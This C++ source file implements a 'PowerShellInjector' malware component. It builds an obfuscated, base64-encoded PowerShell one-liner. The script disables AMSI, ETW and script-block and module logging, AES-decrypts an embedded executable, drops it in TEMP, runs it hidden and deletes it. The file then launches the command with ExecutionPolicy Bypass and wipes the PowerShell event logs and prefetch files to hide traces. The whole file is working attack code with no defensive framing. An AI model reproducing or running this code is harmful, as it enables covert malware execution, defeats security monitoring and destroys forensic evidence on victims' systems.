#include "powershell_injector.hpp"
#include <windows.h>
#include <wincrypt.h>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <sstream>

#pragma comment(lib, "crypt32.lib")

namespace l4g::injection {

std::string PowerShellInjector::generate_random_var_name() {
    static std::mt19937_64 rng((uint64_t)std::chrono::high_resolution_clock::now().time_since_epoch().count());
    static const char* chars = "abcdefghijklmnopqrstuvwxyz";
    std::uniform_int_distribution<int> len_dist(8, 16);
    std::uniform_int_distribution<int> char_dist(0, 25);
    int len = len_dist(rng);
    std::string out;
    out.reserve(len);
    for (int i = 0; i < len; ++i) out.push_back(chars[char_dist(rng)]);
    return out;
}

std::string PowerShellInjector::generate_bypass_stub() {
    return R"(
$ErrorActionPreference='SilentlyContinue'
[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12

# AMSI Bypass
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# ETW Bypass
try {
    $etw = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
    $etw.GetField('m_enabled','NonPublic,Instance').SetValue((gv 'PSDefaultEventProvider').Value,$false)
} catch {}

# ScriptBlock Logging Bypass
try {
    $scriptBlock = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')
    $scriptBlock.GetField('s_logScriptBlock','NonPublic,Static').SetValue($null,$false)
} catch {}

# Module Logging Bypass
try {
    $module = [Ref].Assembly.GetType('System.Management.Automation.ModuleIntrinsics')
    $module.GetField('s_logPipelineExecutionDetail','NonPublic,Static').SetValue($null,$false)
} catch {}
)";
}

std::string PowerShellInjector::obfuscate_script(const std::string& script) {
    // Simple string splitting obfuscation
    std::string out = script;
    // Replace common strings with concatenated versions
    size_t pos = 0;
    while ((pos = out.find("System.", pos)) != std::string::npos) {
        out.replace(pos, 7, "'Sys'+'tem.'");
        pos += 13;
    }
    pos = 0;
    while ((pos = out.find("Management.", pos)) != std::string::npos) {
        out.replace(pos, 11, "'Mana'+'gement.'");
        pos += 17;
    }
    pos = 0;
    while ((pos = out.find("Automation.", pos)) != std::string::npos) {
        out.replace(pos, 11, "'Auto'+'mation.'");
        pos += 17;
    }
    return out;
}

std::string PowerShellInjector::create_encoded_command(const std::string& script) {
    // Convert to UTF-16LE then Base64
    int wide_len = MultiByteToWideChar(CP_UTF8, 0, script.c_str(), -1, nullptr, 0);
    std::vector<wchar_t> wide(wide_len);
    MultiByteToWideChar(CP_UTF8, 0, script.c_str(), -1, wide.data(), wide_len);
    
    // Remove null terminator
    std::vector<uint8_t> utf16((uint8_t*)wide.data(), (uint8_t*)wide.data() + (wide.size() - 1) * 2);
    
    // Base64 encode
    DWORD b64_len = 0;
    CryptBinaryToStringA(utf16.data(), (DWORD)utf16.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &b64_len);
    std::string b64(b64_len, 0);
    CryptBinaryToStringA(utf16.data(), (DWORD)utf16.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, (LPSTR)b64.data(), &b64_len);
    
    return b64;
}

std::string PowerShellInjector::generate_onliner(const std::vector<uint8_t>& encrypted_payload, const std::string& key_b64) {
    std::string var_payload = generate_random_var_name();
    std::string var_key = generate_random_var_name();
    std::string var_aes = generate_random_var_name();
    std::string var_decryptor = generate_random_var_name();
    std::string var_plain = generate_random_var_name();
    std::string var_path = generate_random_var_name();
    std::string var_bytes = generate_random_var_name();

    // Payload layout is IV(16) || AES-256-CBC ciphertext. PowerShell 5.1's
    // .NET Framework has no AesGcm, so GCM here would fail at runtime.
    DWORD b64_len = 0;
    CryptBinaryToStringA(encrypted_payload.data(), (DWORD)encrypted_payload.size(),
                         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &b64_len);
    std::string payload_b64(b64_len ? b64_len - 1 : 0, '\0');
    if (b64_len) {
        CryptBinaryToStringA(encrypted_payload.data(), (DWORD)encrypted_payload.size(),
                             CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                             payload_b64.data(), &b64_len);
        payload_b64.resize(b64_len ? b64_len - 1 : 0);
    }

    std::ostringstream script;
    script << generate_bypass_stub() << "\n";
    script << "$" << var_payload << " = [Convert]::FromBase64String(\"" << payload_b64 << "\")\n";
    script << "$" << var_key << " = [Convert]::FromBase64String(\"" << key_b64 << "\")\n";
    script << "$" << var_aes << " = [System.Security.Cryptography.Aes]::Create()\n";
    script << "$" << var_aes << ".Key = $" << var_key << "\n";
    script << "$" << var_aes << ".Mode = [System.Security.Cryptography.CipherMode]::CBC\n";
    script << "$" << var_aes << ".Padding = [System.Security.Cryptography.PaddingMode]::PKCS7\n";
    script << "$" << var_aes << ".IV = $" << var_payload << "[0..15]\n";
    script << "$" << var_decryptor << " = $" << var_aes << ".CreateDecryptor()\n";
    script << "$" << var_plain << " = $" << var_decryptor << ".TransformFinalBlock($" << var_payload
           << ", 16, $" << var_payload << ".Length - 16)\n";
    script << "$" << var_path << " = Join-Path $env:TEMP ([IO.Path]::GetRandomFileName() + '.exe')\n";
    script << "$" << var_bytes << " = $" << var_plain << "\n";
    script << "[IO.File]::WriteAllBytes($" << var_path << ", $" << var_bytes << ")\n";
    script << "Start-Process -FilePath $" << var_path << " -WindowStyle Hidden\n";
    script << "Start-Sleep -Milliseconds 1500\n";
    script << "Remove-Item -LiteralPath $" << var_path << " -Force\n";

    return create_encoded_command(script.str());
}

PSInjectResult PowerShellInjector::execute_injection(const std::string& ps_onliner) {
    PSInjectResult result;
    
    std::wstring cmd = L"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -EncodedCommand " + 
                       std::wstring(ps_onliner.begin(), ps_onliner.end());
    
    STARTUPINFOW si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = {};
    
    if (!CreateProcessW(nullptr, (LPWSTR)cmd.c_str(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, nullptr, nullptr, &si, &pi)) {
        result.error = "CreateProcess failed: " + std::to_string(GetLastError());
        return result;
    }
    
    result.pid = pi.dwProcessId;
    
    // Wait briefly for injection to complete
    WaitForSingleObject(pi.hProcess, 5000);
    
    // Terminate PowerShell process
    TerminateProcess(pi.hProcess, 0);
    
    // Wipe traces
    wipe_powershell_traces(pi.dwProcessId);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    result.success = true;
    return result;
}

bool PowerShellInjector::wipe_powershell_traces(DWORD pid) {
    // Clear PowerShell Operational log
    HANDLE hLog = OpenEventLogW(nullptr, L"Microsoft-Windows-PowerShell/Operational");
    if (hLog) {
        ClearEventLogW(hLog, nullptr);
        CloseEventLog(hLog);
    }
    
    // Clear ScriptBlock log
    hLog = OpenEventLogW(nullptr, L"Microsoft-Windows-PowerShell/ScriptBlock");
    if (hLog) {
        ClearEventLogW(hLog, nullptr);
        CloseEventLog(hLog);
    }
    
    // Clear Module log
    hLog = OpenEventLogW(nullptr, L"Microsoft-Windows-PowerShell/Module");
    if (hLog) {
        ClearEventLogW(hLog, nullptr);
        CloseEventLog(hLog);
    }
    
    // Clear Provider log
    hLog = OpenEventLogW(nullptr, L"Microsoft-Windows-PowerShell/Provider");
    if (hLog) {
        ClearEventLogW(hLog, nullptr);
        CloseEventLog(hLog);
    }
    
    // Clear prefetch
    std::wstring prefetch = L"C:\\Windows\\Prefetch\\POWERSHELL.EXE-*.pf";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(prefetch.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::wstring path = L"C:\\Windows\\Prefetch\\" + std::wstring(fd.cFileName);
            DeleteFileW(path.c_str());
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }
    
    // Clear AmCache
    // Requires registry manipulation - skip for brevity
    
    return true;
}

} // namespace l4g::injection